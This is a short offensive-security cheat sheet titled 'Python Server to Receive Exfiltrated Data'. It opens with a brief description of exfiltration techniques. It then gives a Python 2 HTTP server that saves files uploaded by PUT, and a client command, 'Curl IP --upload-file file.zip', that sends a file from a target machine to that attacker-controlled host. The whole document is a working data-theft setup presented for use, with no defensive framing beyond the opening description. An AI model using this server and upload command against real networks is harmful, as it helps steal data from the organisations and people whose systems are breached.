# Python Server to Receive Exfiltrated Data

### Data Exfiltration

The adversary is trying to steal data.

Exfiltration consists of techniques that adversaries may use to steal data from your network. Once theyâ€™ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.

### Server Code

```python
#!/usr/bin/python

import SimpleHTTPServer
import BaseHTTPServer

class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_PUT(self):
        print self.headers
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))

if __name__ == '__main__':
    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```

### Client Code

```bash
Curl IP --upload-file file.zip
```
